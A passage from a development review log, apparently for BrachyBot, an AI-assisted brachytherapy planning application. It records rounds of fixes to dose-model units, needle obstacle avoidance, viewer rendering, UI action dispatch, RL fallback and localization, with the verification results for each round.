applies that reversible checkpoint-scale conversion before returning the model
dose array. This preserves the existing planner/report unit contract while
keeping the new DoseUNet as the only dose source. It is not a Gaussian,
analytical, or legacy-model fallback.

The `32^3` and `64^3` references in the historical review text mean cubic
voxel crops/windows; the deployed adapter uses the checkpoint-compatible
`64^3` sliding window.

### Naming follow-up

The active clinical knowledge-base entry and the dose-model path regression
test were also updated to the canonical `dose_unet_spacing1mm` name. The
remaining historical references to retired implementations are retained only
inside review history, where they document what was removed.
## Round 15 Progress and cancellation follow-up (2026-07-14)

### Progress breathing animation

The active Progress row used an infinite animation, but a later
`prefers-reduced-motion` rule applied `animation-iteration-count: 1` globally.
On systems with reduced motion enabled, a still-running step therefore pulsed
once and looked frozen. The final behavior is deliberately static, not
re-animated: active rows retain a clear border and status color while every
motion effect stops. This respects the operating-system preference and avoids
the misleading one-cycle pulse. On systems without reduced motion, the active
row keeps its subtle infinite pulse until its own terminal event.

### Dose pipeline hardware selection

The standalone DoseUNet adapter correctly selected CUDA, but the production
`planning_pipeline` helper still called `load_dose_model(device="cpu")`.
This was a real performance defect: the full seed optimization could execute
the neural dose model repeatedly on CPU even when RTX GPUs were idle. The
pipeline now uses `plans.device_manager.get_device` with caller identity
`planning_pipeline_dose`, logs the selected device, and falls back to CPU only
when the centralized manager cannot provide CUDA. The model architecture,
preprocessing contract, and coordinate conversion remain unchanged.

### Stop-button cleanup

The Stop button aborted the fetch and notified the backend, but the early
abort path returned before the local thinking-chain and todo cleanup code. The
live thinking timer, todo elapsed timers, GPU polling, animation guards, and
active CSS classes could therefore continue after cancellation. A turn-local
cleanup callback now marks unfinished todo rows terminal, clears all timers and
polling, stops the breathing state, cancels pending trace pills, and folds the
progress dock. The active-turn identity guards against an old aborted request
clearing a newer request's AbortController.

### Verification

- `node --check` passes for the modified chat JavaScript.
- Python syntax checks pass for the modified planning pipeline and regression
  test.
- Regression assertions cover persistent reduced-motion animation, centralized
  dose-device selection, and stop cleanup.
- Remote RTX smoke testing should verify `planning_pipeline_dose` reports
  `cuda:0` or `cuda:1` and that a multi-seed plan no longer runs the new model
  on CPU.

## Round 16 Dose-runtime and cancellation follow-up (2026-07-14)

### Coordinate-chain verification

The new DoseUNet adapter was checked on the deployed CT geometry without
changing the established `(z, y, x)` planner convention or the SimpleITK LPS
world conversion. The actual CT inference returned a finite, non-empty dose
array, and the selected CUDA device was reported as `cuda:1`. This is evidence
against a coordinate conversion producing an empty dose field in the observed
slow run; the coordinate contract is intentionally left unchanged because it
is already coupled to the viewer and seed transforms.

### Bounded Stage 2 replanning

`plans/core.py` had a real robustness defect: the Stage 2 `replan` loop had no
iteration cap, and `plans.utilizations.replan()` could report success when the
coverage value did not measurably improve. If the target coverage was
unreachable because of a model/unit/input issue, the same expensive dose-model
sweep could repeat indefinitely. Stage 2 now has a 100-iteration upper bound
and stops when the coverage change is at most `1e-6`, retaining the best plan
found and logging the reason. This bounds worst-case work without modifying
coordinate math or silently declaring an unmet target successful.

### Stop-state hardening

The local Stop path now handles the case where browser AbortController/SSE
state is already out of sync. It invokes a global visible-progress cleanup in
addition to the turn-local cleanup, clearing thinking rows, live trace timers,
todo timers, GPU polling, animation guards, and floating progress remnants.
The backend cancellation request remains in place to invalidate the active
agent turn token. A stopped turn is never reused as a successful plan result.

### Verification

- `node --check` passes for both modified chat scripts.
- `git diff --check` passes.
- Regression coverage checks the global Stop fallback and the Stage 2 bound.
- The modified chat scripts use a new static query version so an already-open
  browser does not silently reuse the pre-fix Stop handler.
- Python unit execution was unavailable in the Windows checkout because its
  local interpreter is missing the standard `encodings` package; the remote
  `brachytherapy` interpreter is the authoritative runtime check.

## Round 17 Dose-normalization audit (2026-07-14)

### Scope

This pass rechecked the deployed `dose_unet_spacing1mm` checkpoint and traced
the complete training-to-report unit path. The audit covered checkpoint
metadata, the standalone predictor, the production model adapter, seed-plan
accumulation, dose evaluation, manual preview, 2D overlays, and 3D
isosurfaces. The established coordinate chain was not changed.

### Verified contract

- Training stores the target as `dose_raw * dose_multiplier`, where the
  deployed checkpoint records `dose_multiplier = 1e12`.
- The standalone predictor reverses that training multiplier exactly once.
- The BrachyBot adapter applies its explicit `planning_output_scale`, which
  currently defaults to the same checkpoint multiplier. The verified ratio is
  `planning_output_scale / dose_multiplier = 1.0`, so the planner receives the
  same normalized dose units used by the existing planning thresholds.
- The checkpoint records channel order
  `(line_map, ct, soft_pos)` and target spacing `(1.0, 1.0, 1.0)`. The
  production loader accepted the checkpoint and attached the matching
  contract.
- Internal dose arrays are normalized model output. The explicit clinical
  display calibration is `DOSE_MODEL_SCALE_GY` (default `120.0`), so physical
  dose conversion is performed once as `normalized_dose * dose_scale_gy`.
  D/V metrics, DVH bins, report values, manual preview, overlay labels, and
  isosurface thresholds follow this same boundary.

### Confirmed issue status

The historical memory key `dose_distribution_gy` is still a compatibility
alias for the resampled normalized array; its name must not be interpreted as
physical Gy. This is a real naming hazard, but it is not currently a numeric
normalization defect: active consumers explicitly read `dose_units` and
`dose_scale_gy`, and the existing endpoints convert thresholds or display
values at the boundary. The alias is retained intentionally to avoid breaking
stored sessions and frontend clients. New code should use the explicit unit
metadata and must not multiply this array by the scale more than once.

No further normalization or coordinate patch was applied in this round because
changing the calibrated `120.0 Gy` boundary without an independently validated
clinical calibration would be unsafe.

### Verification

- Remote checkpoint metadata inspection passed.
- Remote production `load_dose_model(..., device='cpu')` smoke test passed and
  confirmed the contract ratio is exactly `1.0`.
- Prior RTX inference on the deployed CT produced a finite, non-empty dose
  field; no evidence supports a normalization-induced empty or runaway dose.
- The remote working tree was clean before this documentation-only update.

## Round 18 Data-tree obstacle policy and user-facing terminology (2026-07-14)

### Confirmed findings

The trajectory planner already consumed an obstacle-valued radiation volume,
and the downstream trajectory code already rejected candidate paths that
intersected obstacle voxels. The defect was upstream: the backend used a stale
numeric whitelist that incorrectly blocked esophagus, trachea, thyroid,
heart, stomach, and bowel while omitting several real bones and cartilage
labels. More importantly, the browser only synchronized aggregate Data tree
counts, so a user moving a mask between the Traversable and Non-traversable
parents could not affect planning.

The Data tree parent classification is now the authoritative per-session
whitelist. The browser sends each organ's stable label ID, display name,
source, and parent category. The planning pipeline reads that state before
trajectory initialization, refreshes it before trajectory refinement, and
refreshes it again immediately before seed optimization. CTV artery/vein
labels remain hard obstacles independently of the OAR whitelist. Older
clients that do not send the detailed organ list retain a name-derived
default policy.

### Default classification

The default policy is derived from the installed TotalSegmentator name map,
not a hand-maintained numeric list. It marks all segmented bones (including
skull, vertebrae, ribs, sternum, cartilage, hips, scapulae, clavicles and
long bones), all artery/vein/vessel structures, and the existing spinal-cord
and nerve safety structures as non-traversable. Soft parenchymal organs remain
traversable by default unless the user explicitly moves them into the
Non-traversable parent. The frontend and backend use matching name rules.

### Data tree interaction fix

Several parent rows, especially the CTV and OAR master rows, routed their
right-click event through the single-item menu. They now open the matching
group menu directly, including visibility, opacity, solo, and reconstruction
actions where applicable. Category changes also trigger an immediate UI-state
synchronization so the next planning call sees the user's whitelist.

### User-facing clinical wording

Final planning responses, report auto-fill text, DVH interpretation text, and
optimization advice no longer expose implementation names such as
`clinical_kb` or `plan_config` to the user. They now say that interpretation
requires applicable site-specific guidance, institutional protocols, or a
confirmed case protocol, while internal memory keys and tool names remain
unchanged for compatibility.

### Verification

- Remote Python compilation passed for all modified Python modules.
- Targeted obstacle policy tests passed on the remote `brachytherapy`
  interpreter, including default bone/vessel/cartilage coverage, explicit
  Data tree override behavior, and preservation of CTV vessel obstacles.
- `git diff --check` passed remotely.
- The remote host does not provide Node.js or pytest, so browser JavaScript
  parsing and the broader pytest suite remain environment-limited; the
  modified JavaScript was kept syntax-local and the server-side contract was
  exercised through the targeted runtime tests.

## Round 19 Obstacle-path enforcement, safe needle rendering, and DVH usability (2026-07-15)

### Confirmed findings

The previous Data tree whitelist fix was real but incomplete. The legacy
trajectory depth scan used a forward obstacle only as a stopping condition;
it did not set the rejection flag. A candidate could therefore survive when
its forward needle segment entered a non-traversable voxel. Separately, the
3D seeds route reconstructed every needle from seed positions and extended
the shallow end by a fixed 100 mm. That display-only extension could cross
segmented OAR, bone, or vessel meshes even when the seed positions themselves
were valid. This explains the red lines passing through the structures in the
reported screenshot.

### Corrective changes

- Added a conservative 0.25-voxel, bidirectional obstacle gate in the
  planning-grid coordinate system. It validates the reverse path to the image
  boundary and the forward target/background path plus a small tip margin.
- Applied the gate after trajectory initialization, during refinement after
  rebuilding the current Data tree obstacle volume, and immediately before
  seed optimization. Invalid trajectories cannot be restored by the old
  depth-filter fallback.
- Kept the needle display strategy independent from the obstacle gate: the
  needle enters from outside and terminates at the deepest seed position. The
  configurable insertion extension is now 150 mm in the shared planning
  settings and the viewer uses that same value. The existing SimpleITK world /
  planning-array conversion chain is preserved.
- Corrected the default reference direction consistently to `[0, 1, 0]` in
  `plans/config.json`, the manual planning controls, the UI-state snapshot,
  the agent defensive fallback, and the chat workflow fallback. Explicit
  user-entered directions and `auto` mode remain unchanged; organ-specific
  `auto` defaults are clinical policy rather than this global fallback.
- Changed the DVH default x-axis to 0–400 Gy and limited display smoothing to
  the same visible 0–400 Gy interval. The Plotly modebar is inset further
  inside the panel so the reset/home control remains fully clickable.
- Added dedicated X-axis-only and Y-axis-only zoom modebar buttons. Each locks
  the other axis during rectangle zoom; Home restores both axes, their zero
  origins, and the default `[0, 400] × [0, 100]` window.
- Updated the 3D viewer controls to match the 3D Slicer mouse convention:
  left-drag rotates, middle-drag pans, right-drag zooms, and the wheel zooms.
  Damping was disabled for direct manipulation and a small polar guard avoids
  the singular pose that made rotation appear stuck. Needle endpoint capture
  and all coordinate conversion paths are unchanged.

### Round 20 Verification

- Updated the DVH script cache version and verified all 0–300 default references
  in the chart/tooltip path were replaced by the shared 0–400 constant.
- `git diff --check` passed; Python backend changes from Round 19 remain
  compiled and unchanged by this UI-only update.
- Node.js and a live browser session are unavailable on the remote host; after
  refreshing the Web UI, verify the two axis-only buttons by dragging a zoom
  rectangle and verify Home restores `(0, 0)` at the lower-left corner.

### Verification

- `py_compile` and `compileall` passed for the modified backend.
- Runtime configuration checks confirmed `DIRECTION_EXTENSION=150` and the
  persisted/global default direction `[0, 1, 0]` are visible to both the
  pipeline and Web UI integration paths.
- Targeted obstacle policy tests passed, including forward and reverse
  synthetic collisions and a safe path.
- The existing trajectory-refinement obstacle regression passed.
- `git diff --check` passed.
- Node.js, pytest, and a live browser session are unavailable on the remote
  host; the remaining UI verification should be performed by refreshing the
  browser and checking the DVH reset control plus a completed plan's needle
  endpoints against the Data tree Non-traversable meshes.

## Round 21 Manual needle replan persistence, request coalescing, and chat event timeline (2026-07-15)

### Confirmed findings

The manual needle drag path did update the browser-side needle mesh, but the
next `/api/manual_planning/update` request only recomputed dose from the old
seed coordinates. More importantly, `/api/planning/seeds_3d` discarded the
explicit needle endpoints saved by the manual planner and reconstructed a new
needle from seed positions on every refresh. Consequently a successful dose
response could be followed by a refresh that visually restored the old needle
and left the particles at their previous positions. This was a real state
round-trip defect, not an intentional clinical behavior.

The chat also rendered every system event as a centered dashed bubble. A
single drag can legitimately produce selection, endpoint update, recompute,
and metric events, so the layout became a tall column of visually repetitive
notices without timestamps. The existing one-shot recompute calls also allowed
multiple needle drags to overlap at the HTTP layer; an older response could
repaint the scene after a newer drag.

### Corrective changes

- Added a world-coordinate seed reprojection step for `needle_drag` and
  `manual_replan`. Each seed is projected onto the previous needle segment and
  placed at the same normalized depth on the new segment; its direction follows
  the new needle axis. Explicit seed drags remain authoritative and are not
  altered by this path.
- Made the manual planning route accept the previous needle geometry and
  return the number of reprojected seeds in the response and metrics. The
  existing DoseUNet inference and patient-world to planning-grid coordinate
  chain remain unchanged.
- Made `/api/planning/seeds_3d` preserve valid explicit world-coordinate
  endpoint pairs saved in a manual plan. Legacy automatic plans without
  explicit points continue using the existing seed-derived needle strategy.
- Added a client-side single-flight queue for manual dose updates. When a new
  drag arrives during an active inference request, only the latest payload is
  queued and stale responses are prevented from repainting the UI. The latest
  successful geometry becomes the next drag baseline.
- Added a persistent-in-progress chat status row with a breathing indicator
  during manual replanning, a queued state for rapid successive drags, and a
  completion/failure transition. The row is removed after the final status is
  shown, while the metric event remains in the session history.
- Replaced centered system/error bubbles with left-aligned timeline rows that
  include a compact status icon, readable wrapping, and `HH:mm:ss` timestamps.
  Session-restored notices use their stored timestamp; live notices use the
  event creation time. The CSS cache version was bumped to ensure the new
  layout is loaded.

### Verification

- Remote `py_compile` passed for `web/server_support.py`,
  `web/routes/planning_routes.py`, and `web/routes/viewer_routes.py`.
- A remote runtime smoke test confirmed that a translated needle moves an
  associated seed by the same relative depth and updates its direction.
- Remote `git diff --check` passed.
- Local Node.js syntax checks passed for the three changed JavaScript files;
  Node.js is not installed on the remote host.
- The full browser interaction still needs one live UI check: drag one needle
  endpoint, wait for the status row to complete, confirm the seed and needle
  remain at the edited geometry, then drag again before completion and confirm
  only the newest result is shown.

## Round 22 3D dose-surface low-end color clipping (2026-07-16)

### Confirmed finding

The 3D dose-surface mesh colors and the independent 3D color bar shared the
`threeD` color mapping entry point, but the low end of several selectable
palettes still sampled black or near-black values. The existing
`_petRainbowDoseSurface()` helper was not connected to that common path, so a
zero or very low dose could look like a missing surface. This was limited to
the 3D dose-surface presentation; the 2D dose overlay intentionally retained
its original mapping.

### Corrective change

- Added a shared 7% low-end display clip at the 3D color-mapping boundary.
  `petRainbow3D`, `petRainbow2`, `hot`, `grayscale`, and `viridis` therefore
  begin with a visible colored sample while the color bar labels still retain
  the true configured minimum dose. The same mapping is used by 3D mesh
  vertex colors and the 3D color bar, so they cannot disagree.
- Kept the 2D path unchanged, including its zero-dose black sample and its
  existing physical dose range.
- Bumped the 3D script cache version to ensure browsers load the corrected
  mapping.

### Verification

- Local Node.js syntax check passed for the modified 3D viewer script.
- A VM smoke test verified that every supported 3D palette produces a
  non-black color at the display minimum and that the 2D `petRainbow2` zero
  sample remains black.
- The remote code is ready for a browser refresh; the live WebGL surface
  should be checked once after server/static reload to confirm the selected
  palette and color bar visually match.

## Round 23 Verified planning, viewer, report, and UI-control fixes (2026-07-17)

### Confirmed findings

- Automatic reference direction was not consistently derived from the patient
  body surface. The planning pipeline now computes a body shell, selects the
  closest surface point to the CTV, and resolves the entry-to-CTV-center vector
  in the existing image/world coordinate contract. Explicit numeric directions
  still take precedence.
- RL planning and rule-based planning did not share the same final trajectory
  safety path. The RL branch now uses the already obstacle-filtered trajectory
  list and the same radiation volume and resolved direction. The previous
  memory re-read that could reintroduce unfiltered trajectories was removed.
- A request to move all 2D viewers to the dose peak could fall into disabled
  code execution and generic screenshots. A dedicated `viewer.dose_peak` UI
  action now maps the stored peak voxel to axial, sagittal, and coronal slice
  indices and updates all three sliders directly.
- 2D and 3D colorbar defaults were inconsistent with the requested display.
  2D now defaults to a linear 0-600 Gy hot scale; 3D defaults to the PET
  Rainbow palette with its independent range. Dose colorbar changes and Data
  tree visibility/opacity changes now schedule a unified immediate redraw of
  all three 2D canvases and the 3D renderer.
- Dose isosurfaces were reconstructed too early. They now load contour metadata
  and 2D contours by default; an explicit group or item context-menu action is
  required for 3D reconstruction.
- OAR output repeated the same clinical caveat in every table row and exposed
  an unsupported status column. The response and exported report now show
  observed metrics with one global interpretation note and do not infer
  clinical pass/fail from defaults.
- Prescription source formatting used placeholders such as `source 1`. The
  report context now preserves verified URLs together with human-readable
  titles for the pancreatic PubMed records, and the report editor/legacy text
  generator accept both the new object format and legacy string URLs.
- The Figure 1 close-up capture hid seeds and framed only the CTV, making the
  requested internal distribution unreadable. The capture now keeps CTV and
  seed meshes, hides OAR/skin/needles, fits their combined bounding box, and
  restores the exact pre-capture visibility and camera state afterward.

### Verification performed

- Local `node --check` passed for the modified viewer, UI API, report, and
  layout scripts.
- Local JSON parsing confirmed `display_3d.show_isosurfaces_by_default=false`.
- Remote source compilation, import smoke tests for the planning/UI/report
  modules, the synthetic automatic-direction check, and `git diff --check`
  passed on the target environment before commit.
- The expensive clinical planning pipeline was not silently replaced by a
  synthetic end-to-end test. A real case should still be run with a clinician
  reviewing the resulting direction, obstacle avoidance, dose, and report.

## Round 24 UI command execution and external-project scope lock (2026-07-17)

### Confirmed findings

- The server-side UI registry covered many controls, but the browser applied a
  returned `ui_controller` action list only after the SSE tool event had already
  been marked complete. Actions were also started with `forEach`, so multi-step
  UI requests had no ordering or visible per-action progress contract.
- UI validation previously allowed a partially valid action batch to execute.
  That could leave a compound request half-applied when one target or value was
  invalid.
- Several existing user-facing controls were registered but not dispatchable
  through the structured action path, including viewer transforms/tools,
  colorbar settings, planning input parameters, 3D mesh opacity, and 3D labels.
- An external-project follow-up such as `你能查到其代码吗` could be routed to
  `filesystem_browser` or `doc_reader`. The runtime had no source boundary that
  distinguished BrachyBot's local implementation from a named external project.
  This is the root cause of the DeepRare/BrachyBot substitution, rather than a
  factual property of the requested project.

### Implemented fixes

- `ui_controller` now rejects malformed or oversized batches and fails closed
  when any action in a batch is invalid. It copies validated input before adding
  confirmation metadata, requires values for value-bearing commands, and
  exposes the expanded declarative control surface.
- The browser now executes validated UI actions sequentially. Each action emits
  a pending and terminal milestone into the live Execution Trace and todo list;
  asynchronous planning, dose-peak navigation, slice refresh, and 3D
  reconstruction handlers now return their Promises to the queue. The redundant
  floating tool spinner is no longer created. Existing explicit reset/fit
  actions remain the only camera/view reset paths.
- Browser dispatch failures now become visible error milestones instead of
  completed actions. This includes missing generic DOM controls, unavailable
  manual-edit functions, and any registered target that lacks a dispatcher.
- Added dispatchers for viewer transforms/tools, dose colorbar and dose-scale
  settings, planning parameters, 3D mesh opacity, and 3D anatomical labels.
  `viewer.dose_peak` remains a single action for synchronized axial,
  sagittal, and coronal navigation.
- Added structured `manual.needle.endpoint` and `manual.seed.position` actions.
  They reuse the established manual-drag handlers, including seed reprojection
  and AI dose/DVH recomputation where applicable, without adding a second
  coordinate-conversion path.
- Updated the system and routing prompts so conversational UI work uses
  `ui.state`/`ui.catalog` plus `ui_controller`, rather than disabled code
  execution or unrelated screenshots when current UI context is required.
- Added an external-project scope detector that carries the most recent named
  project into short follow-ups, forces public web search, uses
  `github_repos` for source-code requests, and filters LLM tool calls to
  `web_search`, `web_fetch`, and `web_access`. The system and routing prompts
  now state the same rule and prohibit substituting local BrachyBot files.
- New Viewer workspaces now default to the `3d-top` layout: the 3D view is
  above a synchronized axial/sagittal/coronal row. Existing session-specific
  layout choices remain intact rather than being silently reset.
- Updated cache-busting versions for the changed chat progress and manual 3D
  scripts so a browser refresh cannot retain an older interaction implementation.

### Verification performed

- Remote `python3 -m py_compile` passed for `llm_runtime.py`,
  `response_tools.py`, and `ui_controller/__init__.py`.
- Remote UI registry smoke tests passed with 87 registered controls, including
  `viewer.dose_peak`, `manual.needle.endpoint`, and `manual.seed.position`;
  valid actions execute and mixed valid/invalid batches are
  rejected without partial execution.
- A dependency-light AST smoke test verified that a DeepRare follow-up becomes
  a web repository query while an explicit BrachyBot code request remains local.
- Local `node --check` passed for `brachybot-ui-api.js` and
  `brachybot-chat-todo.js`; remote `git diff --check` passed.
- A full clinical run and browser automation were not performed in this batch;
  the changes preserve the existing coordinate conversion and planning engines.

## Round 22 Embedded hard-obstacle preservation and needle baseline restore (2026-07-18)

### Confirmed findings

The prior obstacle whitelist was correct for the installed TotalSegmentator
label map, but it did not preserve hard structures emitted by a CTV model when
a later full OAR segmentation replaced the shared `oar_array`. In particular,
the pancreatic CTV model emits artery/vein voxels in its own local label
namespace; those voxels could disappear from the planning obstacle volume.
The 3D endpoint context menu also had no route back to the immutable automatic
plan, and its context raycast could hit a shaft or surface before the endpoint
handle.

### Corrective changes

- Preserve CTV-model hard structures in `ctv_embedded_oar_array` and merge them
  into the planning OAR grid under a private, non-clinical label. The private
  label is added to the active obstacle whitelist and is never exposed as a
  clinical organ name.
- Resolve hard obstacles from the installed TotalSegmentator names, the
  current Data Tree `non_traversable` category, stored runtime organ names,
  and the embedded CTV hard mask. The final original-grid physical needle
  validator remains the last safety gate before automatic results are
  published.
- Save a compact `algorithm_plan_snapshot` after each successful automatic
  seed plan. It contains world-coordinate seed positions/directions and the
  validated 150 mm needle endpoints, without serializing dose tensors.
- Add `POST /api/manual_planning/restore_needle`. It restores one needle and
  only its associated seeds from that snapshot, recomputes the trained
  DoseUNet dose, and returns the refreshed plan state. No client-supplied
  geometry can replace the saved algorithm baseline.
- Make 3D endpoint handles win right-click hit testing. Endpoint and needle
  context menus now expose baseline restore, show/hide, opacity, seed listing,
  and deletion; the Data Tree needle menu uses the same restore action.
- Bump the dose colorbar preference namespace to v4 so existing browsers do
  not retain an older palette as the new default; the 2D default is PET
  Rainbow.

### Round 22 verification

- `tests/test_needle_obstacle_safety.py`, `tests/test_planning_loop_guards.py`,
  and `tests/test_rl_termination_and_batched_dose.py`: **12 passed, 1 skipped**
  (optional `gymnasium` dependency unavailable).
- Python compilation passed for the planning pipeline, agent, planning routes,
  and obstacle regression tests.
- Node syntax checks passed for `brachybot-3d-manual.js` and
  `brachybot-viewer-volume.js`.
- `git diff --check` passed. A live WebGL session still needs the RTX host for
  visual confirmation of endpoint right-click and rendered bone avoidance.

## Round 23 Bone obstacle enforcement and verified-rendering hardening (2026-07-18)

### Confirmed findings

The prior safety logic correctly classified TotalSegmentator vertebrae, ribs,
sternum, cartilage, and other hard structures, but two edge paths could still
make the policy appear ineffective. First, the private label used to preserve
CTV-model hard structures was converted to `uint8` during planning-grid
resampling; values above 255 wrapped and no longer matched the whitelist.
Second, the 3D seed endpoint API accepted explicit serialized trajectory points
before consulting the automatic pipeline's validated geometry. That was safe
for manually edited plans but could bypass the automatic validation contract
if such a field appeared in an automatic record.

### Corrective changes

- Preserve OAR and embedded obstacle label values as `int32` during nearest
  neighbour resampling. This keeps private embedded labels and all bone label
  IDs lossless, so the candidate radiation volume and final physical needle
  validator see the same hard-mask voxels.
- Automatic 3D needles now require `verified_needle_geometry`; serialized
  explicit trajectory points are accepted only when the workspace is in a
  validated manual-needle state. The viewer can no longer render a second,
  unchecked automatic needle geometry.
- Right-click hit testing now prioritizes endpoint handles over anatomical
  surfaces and needle shafts, making baseline restore deterministic even when
  objects overlap in screen space.

### Verification

- Added a regression contract for the report language and verified-source
  behavior. Remote Python and JavaScript checks pass.

- Bone regression test: TotalSegmentator label 26 (`vertebrae_S1`) remains
  label 26 after planning-grid resampling and is converted to an obstacle voxel.
- `tests/test_needle_obstacle_safety.py`: **5 passed**.
- The earlier liveness/obstacle suite remains green: **12 passed, 1 skipped**
  (optional `gymnasium` dependency unavailable).
- Python compilation, Node syntax checks, and `git diff --check` remain part of
  the final verification. A live RTX WebGL run is still required to visually
  confirm the exact patient case after deployment.

## Round 24 Physical OAR alignment and display-time obstacle gate (2026-07-18)

### Confirmed root cause

The remaining report that needles crossed bone masks was consistent with a
real spatial-contract defect in the TotalSegmentator adapter. Its output was
read with nibabel and transposed from `(X, Y, Z)` to `(Z, Y, X)`, but the
NIfTI affine was discarded. TotalSegmentator may canonicalize or reorient its
NIfTI output, so equal array shapes did not guarantee equal physical
locations. The CT, OAR Data Tree, and needle validator could therefore use
different anatomical positions while all appearing internally valid.

### Corrective changes

- Removed the raw nibabel transpose path from
  `tool_factory/OAR_seg/totalsegmentator_oar.py`.
- Read the generated NIfTI with SimpleITK and resampled it onto the exact
  input CT grid with the identity physical transform and nearest-neighbour
  interpolation. Label IDs are preserved as `int32`/`uint16` and the returned
  array is explicitly `(Z, Y, X)`.
- Added a physical-origin regression test proving that a shifted exported
  bone label lands on the corresponding CT voxel, rather than merely on the
  same array index.
- The `/api/planning/seeds_3d` response now revalidates every automatic and
  manual needle against the current Data Tree hard-obstacle policy immediately
  before rendering. If a category was changed after planning, or a stale
  geometry record is unsafe, that needle is withheld instead of being drawn.
  This uses the same SimpleITK physical-coordinate validator as planning and
  does not introduce a second coordinate convention.

### Verification

- `tests/test_oar_spatial_alignment.py`, the obstacle policy tests, and the
  needle safety tests: **10 passed**.
- Full local suite: **153 passed, 1 skipped**. The skipped test requires the
  optional `gymnasium` dependency.
- Python compilation passed for the changed OAR adapter, planning pipeline,
  and viewer routes. Node syntax checks passed for the 3D/viewer scripts, and
  `git diff --check` passed.
- A live patient run on the RTX host is still required to confirm the exact
  current case after deployment; until then, the server intentionally fails
  closed by withholding any needle whose physical validation cannot be
  completed.

## Round 25 Direct-tool obstacle-policy closure (2026-07-18)

### Confirmed finding

The unified `planning_pipeline` already removed unsafe candidates before seed
optimization, but the legacy public entry points `trajectory_planning` and
the standalone seed-planning tools could still be invoked directly by an LLM.
Those calls consumed caller-provided or previously cached trajectories, so a
stale list could bypass the current Data Tree non-traversable classification.
The 3D rendering gate alone was therefore insufficient: it could hide an
unsafe line after an optimizer had already used it.

### Corrective changes

- `BrachyAgent` now builds the active radiation volume from the current CTV,
  OAR, embedded hard structures, mandatory bone/vessel baseline, and current
  Data Tree additions before direct planning-tool execution.
- Direct `trajectory_planning` calls receive that authoritative volume rather
  than stale/client-supplied geometry. Returned candidates are filtered by the
  same voxel-path gate and the complete physical 150 mm needle validator.
- Direct `seed_planning`, `seed_planning_rule_based`, and `seed_planning_rl`
  calls receive only candidates that pass both gates. If no safe candidate
  remains, the operation fails explicitly and no optimizer is run.
- The unified pipeline remains the canonical implementation; this change
  closes legacy entry points without altering coordinate transforms or the
  existing Data Tree categories.

### Verification

- Added a regression test proving a direct planning entry point rejects a
  trajectory crossing a Data Tree hard mask.
- Targeted obstacle/alignment suite: **11 passed**.
- Full local suite and live RTX execution remain required after deployment;
  the final renderer gate continues to fail closed when mask geometry cannot
  be verified.

## Round 26 RL outcome, session isolation, and seed-projection closure (2026-07-18)

### Confirmed findings

The reported RL delay was not caused by an unreachable `while` condition. The
RL path has finite candidate, hierarchy-depth, episode, action, and wall-clock
limits, and the DoseUNet inference adapter checks its deadline between windows.
The real product issue was that a bounded RL result below the requested target
could still be published as a normal successful plan, and its report could
still say `rule_based`. Separately, the final automatic needle geometry was
being re-derived from seed positions rather than taken from the already
filtered optimizer trajectory. That made the display and the candidate safety
domain disagree for oblique or transformed trajectories.

### Corrective changes

- RL now measures target coverage from its actual AI dose maps. When coverage
  is below `DVH_rate`, the same Data Tree-filtered candidate domain is sent to
  the AI-dose rule-based optimizer as a deterministic fallback. The stored
  plan configuration records `mode`, `effective_mode`, fallback usage, RL
  coverage, and final coverage. The pipeline summary no longer hides the
  effective mode.
- `fallback_to_rule_based` is now an explicit validated planning parameter and
  defaults to enabled in `plans/config.json`. It can be disabled for a research
  run, but the report then preserves the fact that RL did not meet the target.
- Final automatic needle geometry is built from the optimizer's trajectory and
  validated in patient physical space against the current non-traversable Data
  Tree masks. Seed positions no longer define or silently replace the accepted
  needle path.
- New-session switching invalidates pending image callbacks, clears all slice
  and overlay canvases, purges 3D meshes and the DVH chart, and dismisses
  transient context menus before restoring the selected workspace. This stops
  late image callbacks from repainting the previous case.
- Context menus now dismiss on capture-phase pointer events, Escape, scroll,
  and case switches, including endpoint menus whose canvas handlers stop event
  propagation.
- 2D seed overlays now sample and clip the actual finite seed cylinder against
  the current MPR plane, then draw its contour using the existing physical
  coordinate chain. The old fixed-radius point marker is no longer used.
- Chinese prescription rationale and tumor-geometry boundary text are kept in
  the selected output language; pathology, stage, and malignancy are not
  inferred from CT geometry.

### Verification

- Full local suite: **154 passed, 1 skipped** before the final regression additions.
- New trajectory-authority regression proves a seed payload inside a hard mask
  cannot override a safe optimizer trajectory, and proves the old reconstructed
  line would have been rejected.
- New prescription-language regression proves Chinese output does not fall
  back to the English rationale or boundary statement.
- Planning-loop regression verifies the explicit RL fallback switch is
  validated and preserved per run.
- Python compilation, Node syntax checks, and `git diff --check` are required
  before deployment. A live RTX patient run remains the final visual check;
  the pipeline continues to fail closed rather than render an unvalidated
  needle.

## Round 27 final UI and geometry review (2026-07-18)

### Confirmed findings and fixes

- The 3D endpoint context menu was not registered with the Data Tree context
  menu owner. The shared dismissal boundary therefore could not see it when a
  user clicked elsewhere. 3D menus now publish a window-level handle, and the
  common `hideContextMenu()` removes both menu types on outside pointer input,
  Escape, scroll, and session changes.
- The 2D seed overlay now receives the active plan's validated seed length and
  radius from `/api/planning/seeds_3d`. It samples the finite cylindrical
  surface in patient-world coordinates and clips that surface against the
  current MPR plane. The 3D cylinder uses the same dimensions, eliminating
  the previous point-circle approximation and the 2D/3D geometry mismatch.
- Invalid or non-positive persisted seed dimensions are rejected in the route
  and replaced with the documented physical defaults (`3.7 mm` length and
  `0.4 mm` radius). This is a display fallback only; it does not alter the
  planning result or dose engine inputs.

### Verification

- Python route and planning modules compile successfully.
- Browser JavaScript syntax checks cover the changed 2D overlay, 3D scene,
  context-menu, layout, and session-isolation modules.
- Full regression tests must pass before deployment; a live patient case is
  still required for visual confirmation of oblique-cylinder contours.

## Round 28 language-consistency follow-up (2026-07-18)

The quality-review agent had a real localization gap: its dynamic target and
OAR issue strings were assembled in English after the fixed-string translation
table had already run. Chinese conversations could therefore contain English
fragments such as `required` and `limit=` even when the rest of the review was
Chinese.

The reviewer now formats dynamic metric and OAR issues through language-aware
formatters, uses Chinese percentage/operator/status text for `zh`, and sends a
plain UTF-8 Chinese-language instruction to the optional LLM reviewer. English
output and metric names/units remain unchanged.

Verification: the focused reviewer suite passed (**77 passed** including the
new dynamic-localization regression), followed by the final full-suite run.

## Round 29 training-monitor audit (2026-07-18)

This round independently checked the reported training-monitor findings
against the actual manual-dose writer, automatic dose-evaluation writer,
training event routes, frontend screenshot bridge, and authentication
boundary.

### Findings and dispositions

- **B4, V100/V150/V200 units: confirmed as a latent contract weakness, not a
  reproduced current-value bug.** Manual and automatic CTV metrics are both
  currently written as `0-1` fractions, while nested OAR `v100/v150` values
